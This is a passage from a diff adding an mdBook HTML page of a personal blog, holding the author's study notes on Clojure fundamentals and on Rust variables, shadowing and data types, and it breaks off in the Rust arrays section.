@@ -1,0 +1,2280 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>theHuntCode</title>
+        <meta name="robots" content="noindex">
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="AboutMe.html"><strong aria-hidden="true">1.</strong> About Me</a></li><li class="chapter-item expanded "><a href="blogs/blog-intro.html"><strong aria-hidden="true">2.</strong> Blogs</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="blogs/clojure-notes.html"><strong aria-hidden="true">2.1.</strong> Clojure Fundamentals</a></li><li class="chapter-item expanded "><a href="blogs/rust-chap3.html"><strong aria-hidden="true">2.2.</strong> Rust Programming Concepts</a></li><li class="chapter-item expanded "><a href="blogs/resnets.html"><strong aria-hidden="true">2.3.</strong> Residual Networks</a></li><li class="chapter-item expanded "><a href="blogs/convnets.html"><strong aria-hidden="true">2.4.</strong> What are Convolutional Neural Networks?</a></li><li class="chapter-item expanded "><a href="blogs/dip3.html"><strong aria-hidden="true">2.5.</strong> Image Functions, Pixels and Types of Image Processing</a></li><li class="chapter-item expanded "><a href="blogs/dip2.html"><strong aria-hidden="true">2.6.</strong> Why Image Processing?</a></li><li class="chapter-item expanded "><a href="blogs/primes.html"><strong aria-hidden="true">2.7.</strong> The Notorious Prime Numbers</a></li><li class="chapter-item expanded "><a href="blogs/metared-ctf.html"><strong aria-hidden="true">2.8.</strong> Data Exfiltration Challenge—CTF Internacional MetaRed 2021-3rd STAGE</a></li><li class="chapter-item expanded "><a href="blogs/dvwa-solutions.html"><strong aria-hidden="true">2.9.</strong> Solutions for DVWA</a></li><li class="chapter-item expanded "><a href="blogs/cybersec-resources.html"><strong aria-hidden="true">2.10.</strong> Cyber Security Resources</a></li><li class="chapter-item expanded "><a href="blogs/dip1.html"><strong aria-hidden="true">2.11.</strong> Intro to Image Manipulation</a></li><li class="chapter-item expanded "><a href="blogs/evolution-of-the-society.html"><strong aria-hidden="true">2.12.</strong> Evolution of the Society — What Next?</a></li><li class="chapter-item expanded "><a href="blogs/data-science-2.html"><strong aria-hidden="true">2.13.</strong> Saai talks Data Science #2</a></li><li class="chapter-item expanded "><a href="blogs/data-science-1.html"><strong aria-hidden="true">2.14.</strong> Saai talks Data Science #1</a></li><li class="chapter-item expanded "><a href="blogs/paths.html"><strong aria-hidden="true">2.15.</strong> Paths — A way into the future for everybody.</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">theHuntCode</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="hi-i-am-saai-sudarsanan"><a class="header" href="#hi-i-am-saai-sudarsanan">Hi, I am Saai Sudarsanan</a></h1>
+<hr />
+<div style="break-before: page; page-break-before: always;"></div><h1 id="blogs"><a class="header" href="#blogs">Blogs</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="clojure-fundamentals"><a class="header" href="#clojure-fundamentals">Clojure Fundamentals</a></h1>
+<h1 id="date-2023-03-04"><a class="header" href="#date-2023-03-04"><small style="font-weight:normal; font-size:0.7em;">Date: 2023-03-04</small></a></h1>
+<hr />
+<p>Dialect of Lisp, that runs on JVM, CLR and also targets JavaScript (Can be transpiled to JS).
+Many features were inherited from Lisp, but also adds on to it. Created by Rich Hickey. It has a big emphasis on concurrency, it is built into the language.</p>
+<ul>
+<li>Dynamic Language
+<ul>
+<li>Flexibility</li>
+<li>Interactivity (Using REPL)</li>
+<li>Consise (they tend to be easier to write, less verbose)</li>
+<li>Exploration</li>
+<li>Focus on the problem</li>
+</ul>
+</li>
+<li>Functional</li>
+<li>Hosted on the JVM</li>
+<li>Supports Concurrency</li>
+<li>Open Source</li>
+</ul>
+<h2 id="functional-programming-languages"><a class="header" href="#functional-programming-languages">Functional Programming Languages</a></h2>
+<ul>
+<li>
+<p>Functions as first class objects : Functions are the same as a integer or a string or any other data structure, they can be created and modified on the fly. They can be passed as parameters and be returned by another function.</p>
+</li>
+<li>
+<p>Compose simple functions together to obtain a function, that targets a more complex purpose.</p>
+</li>
+<li>
+<p>Pure Function : A function for a set of arguements always returns the same output, and is not affected by anything else.</p>
+</li>
+<li>
+<p>Immutability : It can't be changed once it has been declared. It is important when concurrency comes into the picture. Avoids then need for locking a variable when multiple agents are needed to act on it.</p>
+</li>
+<li>
+<p>Laziness : A programming language will only do, as much work as it is asked to do. In haskell, if <code>i = 1+2</code> , the operation won't be performed until i is accessed. In clojure, it is not lazy in terms of mathematical operations, but it is in terms of sequences. We could generate a list of prime numbers.</p>
+</li>
+</ul>
+<h2 id="who-uses-clojure-"><a class="header" href="#who-uses-clojure-">Who uses Clojure ?</a></h2>
+<ul>
+<li>Swym</li>
+<li>Boeing</li>
+<li>Cisco</li>
+<li>Netflix</li>
+<li>CitiGroup</li>
+<li>LinkedIn</li>
+<li>Walmart</li>
+<li>Salesforce</li>
+<li>HelpShift</li>
+</ul>
+<h2 id="why-clojure-"><a class="header" href="#why-clojure-">Why Clojure ?</a></h2>
+<ul>
+<li>Expressive, Elegant</li>
+<li>Good Performance
+<ul>
+<li>Useful for the same tasks Java is</li>
+<li>Wrapper-free Java Access</li>
+</ul>
+</li>
+<li>Powerful Extensibility</li>
+<li>Functional Programming and Concurrency</li>
+</ul>
+<h3 id="clojure-is-a-lisp"><a class="header" href="#clojure-is-a-lisp">Clojure is a Lisp</a></h3>
+<ul>
+<li>Dynamic</li>
+<li>Code as data</li>
+<li>Reader</li>
+<li>Small Core (Lesser Syntax)</li>
+<li>Sequences</li>
+<li>Syntactic Abstraction</li>
+</ul>
+<h3 id="dynamic-development"><a class="header" href="#dynamic-development">Dynamic Development</a></h3>
+<ul>
+<li>REPL - read-eval-print-loop</li>
+<li>Define functions on the fly</li>
+<li>Load and Compile code at runtime</li>
+<li>Introspection</li>
+<li>Interactive Environment</li>
+</ul>
+<h3 id="atomic-data-types"><a class="header" href="#atomic-data-types">Atomic Data Types</a></h3>
+<ul>
+<li>Arbitrary Precision Integers</li>
+<li>Doubles - 1.234</li>
+<li>BigDecimals - 1.234M</li>
+<li>Ratios - 22/7</li>
+<li>Strings - "fred" -&gt; Only double quotes permitted</li>
+<li>Characters - \a \b \c</li>
+<li>Symbols - fred, ethel</li>
+<li>Keywords - :fred, :ethel</li>
+<li>Booleans - true false
+<ul>
+<li>Only <code>false</code> and <code>nil</code> are logically false in clojure, everything else is logically true.</li>
+</ul>
+</li>
+<li>Null - nil</li>
+<li>Regex Patterns - #"a*b"</li>
+</ul>
+<h3 id="data-structures"><a class="header" href="#data-structures">Data Structures</a></h3>
+<ul>
+<li>Lists - singly linked (grows at front)
+<ul>
+<li><code>(1 2 3 4 5) (fred ethel lucy) (list 1 2 3)</code></li>
+</ul>
+</li>
+<li>Vectors - indexed access, grow at end
+<ul>
+<li><code>[1 2 3 4 5] [fred  ethel lucy]</code> // Anything can be a element of a vector</li>
+</ul>
+</li>
+<li>Maps - key/value associations
+<ul>
+<li>Unordered (Hash Map)</li>
+<li>Constant or Near Constant Time LookUp</li>
+<li><code>{:a 1, :b 1, :c 3} {1 "ethel" 2 "fred"}</code></li>
+</ul>
+</li>
+<li>Sets
+<ul>
+<li><code>#{fred ethel lucy}</code></li>
+</ul>
+</li>
+<li>Everything Nests</li>
+<li>All are heterogeneous</li>
+</ul>
+<h3 id="syntax"><a class="header" href="#syntax">Syntax</a></h3>
+<ul>
+<li>Data Structures are the code</li>
+<li>Homoiconicity</li>
+<li>No more text-based syntax!</li>
+</ul>
+<h3 id="java-evaluation"><a class="header" href="#java-evaluation">Java Evaluation</a></h3>
+<p><img src="blogs/./media/clojure-notes/eval-java.png" alt="Java Evaluation" /></p>
+<h3 id="clojure-evaluation"><a class="header" href="#clojure-evaluation">Clojure Evaluation</a></h3>
+<p><img src="blogs/./media/clojure-notes/eval-cloj.png" alt="Clojure Evaluation" /></p>
+<h3 id="interactivity-programs-writing-programs-and-syntactic-abstractions"><a class="header" href="#interactivity-programs-writing-programs-and-syntactic-abstractions">Interactivity, Programs Writing Programs and Syntactic Abstractions</a></h3>
+<p><img src="blogs/./media/clojure-notes/adv-clj.png" alt="Interacitivity and Programs Writing Programs" /></p>
+<p>The program generates the data structures and these data structures are then compiled. There are macros.</p>
+<h2 id="expressions"><a class="header" href="#expressions">Expressions</a></h2>
+<ul>
+<li>Everything is an expression</li>
+<li>All data literals represent themselves
+<ul>
+<li>Except:
+<ul>
+<li>Symbols -&gt; Looks for binding to value, locally then globally.</li>
+<li>Lists -&gt; A form of operation.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="operations"><a class="header" href="#operations">Operations</a></h2>
+<ul>
+<li>(op ...) -&gt; general format of operations</li>
+<li>Clojure will try to evaluate the first thing inside the paranthesis as a function call.</li>
+<li>The open ends need not always be a data arguement and can be an expression or a function call, whose output is used.</li>
+<li>An op can be :
+<ul>
+<li>
+<p>one of very few <code>Special Ops</code></p>
+</li>
+<li>
+<p>macro</p>
+</li>
+<li>
+<p>expression which yields a function</p>
+</li>
+<li>
+<p>Special Ops: (They may not be evaluated)</p>
+<ul>
+<li>
+<p>(<code>def</code> name value-expr)</p>
+<ul>
+<li>establishes a global variable</li>
+</ul>
+</li>
+<li>
+<p>(<code>if</code> text-expr then-expr else-expr)</p>
+<ul>
+<li>Conditional, evaluates only one of then/else.</li>
+</ul>
+</li>
+<li>
+<p>Other Special Ops:</p>
+<p><code>fn let loop recur do new . throw try set! quote var</code></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="macros"><a class="header" href="#macros">Macros</a></h2>
+<ul>
+<li>Supplied with Clojure</li>
+<li>Arguement forms are passed as data to the macro function, which returns a new data structure as a replacement for the macro call.</li>
+<li>Macro handling occurs at compile time.</li>
+</ul>
+<pre><code class="language-clj">(or x y) ; or is not primitive it can be defined in terms of if
+
+becomes
+
+(let [or__158 x]
+    (if or__158 or__158 y))
+</code></pre>
+<p>Many things built into other languages are just macros in Clojure.</p>
+<h2 id="functions"><a class="header" href="#functions">Functions</a></h2>
+<ul>
+<li>First Class Values</li>
+<li>Maps, Vectors and Sets and all are functions in Clojure</li>
+</ul>
+<pre><code class="language-clj">    (def five 5)
+    (def sqr (fn [x] (* x x)))
+    (sqr five)
+    &gt;&gt;&gt; 25
+    (def m{:fred :ethel :ricky :lucy})
+    (m :fred)
+    :ethel
+</code></pre>
+<h2 id="syntax-summary-clj--java"><a class="header" href="#syntax-summary-clj--java">Syntax Summary clj // java</a></h2>
+<pre><code class="language-clj">(def i 5) ; int i = 5;
+
+(if (zero? x) y z) ; if(x == 0)
+                   ;        return y;
+                   ;   else
+                   ;         return z;
+
+(* x y z) // x * y * z
+
+(foo x y z) // foo(x, y, z); 
+
+(. foo bar x) // foo.bar(x)
+</code></pre>
+<h2 id="sequences"><a class="header" href="#sequences">Sequences</a></h2>
+<ul>
+<li>Abstraction of Lisp Lists</li>
+<li>(seq coll)
+<ul>
+<li>if collection is non-empty, return seq object on it, else nil</li>
+</ul>
+</li>
+<li>(first seq)
+<ul>
+<li>returns first element</li>
+</ul>
+</li>
+<li>(rest seq)
+<ul>
+<li>returns a seq of the rest of the elements, or nil if no more. All but the first.</li>
+</ul>
+</li>
+</ul>
+<h2 id="sequence-library"><a class="header" href="#sequence-library">Sequence Library</a></h2>
+<pre><code class="language-clj">(drop 2 [1 2 3 4 5])
+&gt;&gt;&gt; (3 4 5)
+
+(take 9 (cycle [1 2 3 4]))
+&gt;&gt;&gt; (1 2 3 4 1 2 3 4 1)
+
+(interleave [:a :b :c :d :e] [1 2 3 4 5])
+&gt;&gt;&gt; (:a 1 :b 2 :c 3 :d 4 :e 5)
+
+(partition 3 [1 2 3 4 5 6 7 8 9])
+&gt;&gt;&gt; ((1 2 3) (4 5 6) (7 8 9))
+
+(map vector [:a :b :c :d :e] [1 2 3 4 5])
+&gt;&gt;&gt; ([:a 1] [:b 2] [:c 3] [:d 4] [:e 5])
+
+(apply str(interpose \, "asdf"))
+&gt;&gt;&gt; "a,s,d,f"
+
+(reduce + (range 100))
+&gt;&gt;&gt; 4950
+</code></pre>
+<h2 id="java-interoperability"><a class="header" href="#java-interoperability">Java Interoperability</a></h2>
+<pre><code class="language-clj">(. Math PI)
+&gt;&gt;&gt; 3.14159265
+
+(.. System getProperties (get "java.version"))
+&gt;&gt;&gt; "1.5.0_13"
+
+(new java.util.Date)
+&gt;&gt;&gt; Thu Jun 05 12:37:32 EDT 2008
+
+(doto (JFrame.) (add (JLabel. "Hello World")) pack show)
+
+;expands to:
+(let* [G__1837 (JFrame.)]
+    (do (. G__1837 (add (JLabel. "Hello World")))
+        (. G__1837 pack)
+        (. G__1837 show))
+    G__1837)
+</code></pre>
+<h2 id="repl"><a class="header" href="#repl">REPL</a></h2>
+<ul>
+<li>Read Eval Print Loop</li>
+<li>Interactive Shell</li>
+<li>Used for exploratory Programming</li>
+<li>Provided a quick feedback cycle</li>
+<li>Connect to the application running in production</li>
+</ul>
+<pre><code class="language-clj">Clojure 1.11.1
+&gt;&gt; "i am a string"
+"i am a string"
+
+; Equality
+&gt;&gt; (= 1 2)
+false
+
+; Add
+&gt;&gt; (+ 1 2 3 4)
+10
+
+; Multiply
+&gt;&gt; (* 1 2 3 4)
+24
+
+; Return first element
+&gt;&gt; (first [1 2 3 4])
+1
+
+; apply a function to all element in a sequence and return the resulting sequence
+&gt;&gt; (map inc [1 2 3])
+(2 3 4)
+
+; Remove based on a condition (here zero? checks for = 0)
+&gt;&gt; (remove zero? [1 0 2 0 3 0])
+(1 2 3)
+
+; Comments look like this
+
+; if statement
+&gt;&gt; (if true "hello" "bye")
+"hello"
+
+&gt;&gt; (if false "hello")
+nil ; the else part returns nil automatically (if test-form then-form else-form)
+
+&gt;&gt; (if (zero? 1) (inc 1) (dec 1))
+0 ; 1 not equal to 0, so (dec 1) = 0
+
+&gt;&gt; (if (zero? 0) (inc 1) (dec 1))
+2 ; 0 equal to 0, so (inc 1) = 2
+
+; do operator (allows us to wrap multiple forms together and run them as one expression)
+&gt;&gt; (if true (do (println "hello") (println "world")) (do (println "bye") "good bye"))
+hello ; this is a side effect of println
+world ; this is a side effect of println
+nil ; this is a return value of (println "world") and the return value of (println "hello") is ignored.
+; in do, the return value is the return value of the expression that is evaluated last.
+
+&gt;&gt; (do "clojure" "is fun")
+"is fun" ; "clojure" is avoided and only "is fun" is returned by do, since it is the last form to be evaluated.
+
+;when operator - used when there is no else part. Combination of if and do. It can also be written just using 'if' and 'do'.
+&gt;&gt; (when true (println (+ 1 2)) (+ 1 4))
+3 ; side effect of println
+5 ; return value of 'when'
+</code></pre>
+<p>A valid clojure expression is called a form, every form returns a value. By convention, if a function returns a true/false(predicate function), we suffix it with a question mark. A function that does a mutataion, we suffix an exclamation mark.</p>
+<pre><code>CTRL + L is used to clear REPL
+
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rust-programming-concepts"><a class="header" href="#rust-programming-concepts">Rust Programming Concepts</a></h1>
+<h1 id="date-2023-03-01"><a class="header" href="#date-2023-03-01"><small style="font-weight:normal; font-size:0.7em;">Date: 2023-03-01</small></a></h1>
+<hr />
+<p>This post is my understanding of the common programming concepts, implemented in Rust. They cover stuff like,</p>
+<ul>
+<li><a href="blogs/rust-chap3.html#variables-and-mutability">Variables and Mutability</a>
+<ul>
+<li><a href="blogs/rust-chap3.html#constants">Constants</a>
+<ul>
+<li><a href="blogs/rust-chap3.html#differences-bw-let-and-const"><strong>Differences b/w Let and Const</strong></a></li>
+</ul>
+</li>
+<li><a href="blogs/rust-chap3.html#shadowing">Shadowing</a></li>
+</ul>
+</li>
+<li><a href="blogs/rust-chap3.html#data-types">Data Types</a>
+<ul>
+<li><a href="blogs/rust-chap3.html#scalar-types">Scalar Types</a></li>
+<li><a href="blogs/rust-chap3.html#compound-types">Compound Types</a></li>
+</ul>
+</li>
+<li><a href="blogs/rust-chap3.html#functions">Functions</a>
+<ul>
+<li><a href="blogs/rust-chap3.html#statements-and-expressions">Statements and Expressions</a></li>
+<li><a href="blogs/rust-chap3.html#returning-values-with-functions">Returning values with Functions</a></li>
+</ul>
+</li>
+<li><a href="blogs/rust-chap3.html#comments">Comments</a></li>
+<li><a href="blogs/rust-chap3.html#control-flow">Control Flow</a>
+<ul>
+<li><a href="blogs/rust-chap3.html#if-condition">If Condition</a></li>
+<li><a href="blogs/rust-chap3.html#loops">Loops</a></li>
+</ul>
+</li>
+</ul>
+<p>They will help you lay a solid foundation on the Rust Programming Language.</p>
+<p><img src="blogs/./media/rust-chap3/ferris.png" alt="Image of Ferris the Crab" /></p>
+<h2 id="variables-and-mutability"><a class="header" href="#variables-and-mutability">Variables and Mutability</a></h2>
+<ul>
+<li>Rust has a set of <strong>keywords</strong>, that are reserved for use only by the language. It is not allowed to use them as names of variables or functions. A list of keywords can be found here <a href="https://doc.rust-lang.org/stable/book/appendix-01-keywords.html">Keywords</a></li>
+<li>By default all variables are <strong>immutable</strong> in Rust. This is make it easier to write <strong>safe and concurrent</strong> code.</li>
+</ul>
+<p><strong>Create a new rust application using the command <code>cargo new &lt;app-name&gt;</code></strong></p>
+<pre><pre class="playground"><code class="language-rust">fn main(){
+    let x = 5;
+    println!("The value of x is {}",x);
+    x = 6;
+    println!("The value of x is {}",x);
+}</code></pre></pre>
+<ul>
+<li>The Rust compiler generates a error message stating, that the immutable variable 'x' cannot be assigned twice.</li>
+<li>Immutability refers to <code>the state of not changing, or being unable to be changed</code>.</li>
+<li></li>
+</ul>
+<p><strong>We run the program using, <code>cargo run</code> command.</strong></p>
+<pre><code>error[E0384]: cannot assign twice to immutable variable `x`
+ --&gt; src/main.rs:4:5
+  |
+2 |     let x = 5;
+  |         -
+  |         |
+  |         first assignment to `x`
+  |         help: consider making this binding mutable: `mut x`
+3 |     println!("The value of x is {}",x);
+4 |     x = 6;
+  |     ^^^^^ cannot assign twice to immutable variable
+</code></pre>
+<ul>
+<li>The variables can be made mutable (changeable) by using the <code>mut</code> command. Mutability makes the code more convenient to write, use it wisely.</li>
+<li>According to my google searches, mutability doesn't have any impact of code generation i.e, doesn't make code slower or faster, and is left to the preference of the user.</li>
+</ul>
+<p><strong>We can now rewrite our old code</strong></p>
+<pre><pre class="playground"><code class="language-rust">fn main(){
+    let mut x = 5;
+    println!("The value of x is {}",x);
+    x = 6;
+    println!("The value of x is {}",x);
+}</code></pre></pre>
+<p><strong>We get the following result :)</strong></p>
+<pre><code>The value of x is 5
+The value of x is 6
+</code></pre>
+<h3 id="constants"><a class="header" href="#constants">Constants</a></h3>
+<ul>
+<li>Rust also has constants, that are bound to a name. They are never allowed to change, there are a few key differences between <code>let</code> and <code>const</code>.</li>
+<li>The naming convention for  <code>const</code> is to make all the characters UPPERCASE, with underscores representing spaces.</li>
+</ul>
+<h4 id="differences-bw-let-and-const"><a class="header" href="#differences-bw-let-and-const"><strong>Differences b/w Let and Const</strong></a></h4>
+<ul>
+<li>No <code>mut</code> in const. You cannot use <code>mut</code> on const.</li>
+<li><em>const</em> <em>must</em> be type annotated, i.e, their types must be explicitly defined by us and is not assumed by default.</li>
+<li><em>const</em> can be declared in any scope, including global scope.</li>
+<li><em>const</em> should be assigned only a value that is predefined, i.e, it cannot be assigned a value that is computed at runtime. This also means, that a function cannot return a <em>const</em>. We can assign <em>const</em> to basic operations though, that can be performed by the compiler at compile time, like
+<code>const THREE_HOURS: u32 = 60*60*3;</code> and these expressions are called <strong>Constant Expressions</strong>, they are evaluated during the compile time.</li>
+<li><em>const</em> values are available for the entire runtime of the program in the scope in which they are declared, use them wisely, to depict values that you know, will not change, like the <strong>speed of light</strong> or the <strong>value of Pi</strong>, etc. Giving them definite names, will make it easier to maintain code.</li>
+</ul>
+<h3 id="shadowing"><a class="header" href="#shadowing">Shadowing</a></h3>
+<p>This is another interesting concept, I have come across, shadowing allows us to overshadow the value that is seen by the compiler, like covering the face with a mask. The compiler will see only the latest value that we have defined for a variable in a particular scope. The following makes it easier.</p>
+<pre><pre class="playground"><code class="language-rust">fn main() {
+    let x = 5;
+
+    let x = x + 1; // Note that we are using the let to overshadow the variable. Cannot be possible without let, due to immutability.
+
+    {
+        let x = x * 2;
+        println!("The value of x in the inner scope is: {x}");
+    }
+
+    println!("The value of x is: {x}");
+}</code></pre></pre>
+<p><strong>Output</strong></p>
+<pre><code>The value of x in the inner scope is: 12
+The value of x is: 6
+</code></pre>
+<ul>
+<li>We are effectively recreating the variable by using the <code>let</code> keyword and not <em>mutating</em> it.</li>
+<li>One more difference is, that we are not allowed to <em>mutate</em> a variable's type, but it can be done using shadowing.</li>
+</ul>
+<hr />
+<h2 id="data-types"><a class="header" href="#data-types">Data Types</a></h2>
+<ul>
+<li>Rust is <em>statically typed language</em>, which means it must know the types of all the variables at compile time. The compiler can also infer the type we might wanna use and set it accordingly, but either way, there must always be a type.</li>
+</ul>
+<h3 id="scalar-types"><a class="header" href="#scalar-types">Scalar Types</a></h3>
+<ul>
+<li>They have a single value, and we have 4 different scalar types in Rust.</li>
+</ul>
+<p><strong>Integer Types</strong></p>
+<ul>
+<li>Integers are numbers without a fractional component.</li>
+<li>They can be signed (i) or unsigned (u). Signed Integers can be made negative, while Unsigned integers can only be positive.</li>
+<li>They can have lengths of 8, 16, 32, 64 or 128-bits.
+(represented or i8 or u8 for 8-bits and similairly for the rest).
+<pre><code>Signed Variants can store from : -(2^n-1) to +(2^(n-1)-1)
+Unsigned Variants can stroe from : 0 to 2^(n-1)-1 
+</code></pre>
+</li>
+<li>They can also be inferred from the architecture (isize or usize).</li>
+<li>Rust defaults to <strong>i32</strong>.</li>
+</ul>
+<p>Integers can be represented in several visual ways, like, hex, octal, binary, bytes or decimal.</p>
+<p><strong>Floating-Point Types</strong></p>
+<p>There are two primitive types for floating-point numbers, f32 and f64. The default is f64, and all floating-points are signed.</p>
+<p><strong>Numeric Operations</strong></p>
+<ul>
+<li>All basic operations such as, addition, subtraction,    multiplication, division and remainder are supported in Rust.</li>
+<li>Integer division truncates to the floor and returns the nearest integer. <code>-5/3 which is equal to -1.66 returns -1</code>.</li>
+</ul>
+<p><strong>Boolean Type</strong></p>
+<ul>
+<li>They have two values <code>true</code> or <code>false</code>.</li>
+<li>Specified using the <code>bool</code> keyword.</li>
+</ul>
+<p><strong>Character Types</strong></p>
+<ul>
+<li>Most primitive alphabetic type</li>
+<li>Used as <code>let c = 'z'</code>, and each character uses 4 bytes, and represents a Unicode Scalar Value, so you can now put emojis, chinese characters, etc, in your code!</li>
+</ul>
+<h3 id="compound-types"><a class="header" href="#compound-types">Compound Types</a></h3>
+<ul>
+<li>Used to group multiple values into one type. Rust has two primitive compound types: tuples and arrays.</li>
+</ul>
+<p><strong>Tuples</strong></p>
+<ul>
+<li>They are used to group a set of variables with different datatypes into a single compound type. They are of fixed size and cannot grow or shrink once declared.</li>
+<li>Optionally we can also declare the type of each value in the tuple.</li>
+</ul>
+<pre><pre class="playground"><code class="language-rust">fn main() {
+    let tup: (i32, f64, u8) = (500, 6.4, 1);
+}</code></pre></pre>
+<pre><pre class="playground"><code class="language-rust">// Getting values out of a tuple
+// Destructuring
+fn main() {
+    let tup = (500, 6.4, 1);
+
+    let (x, y, z) = tup;
+
+    println!("The value of y is: {y}");
+}
+
+// Indexing
+fn main() {
+    let x: (i32, f64, u8) = (500, 6.4, 1);
+
+    let five_hundred = x.0; // Indices start from 0
+
+    let six_point_four = x.1;
+
+    let one = x.2;
+}</code></pre></pre>
+<ul>
+<li>A Tuple with no values is called a unit and represents an empty value or an empty return type. Expressions usually return the 'unit' when there is not return value.</li>
+</ul>
+<p><strong>Arrays</strong></p>
+<ul>
+<li>Another way to group multiple values, but in arrays all values must have the same type.</li>
+<li>They also cannot grow or shrink in size.</li>
+</ul>
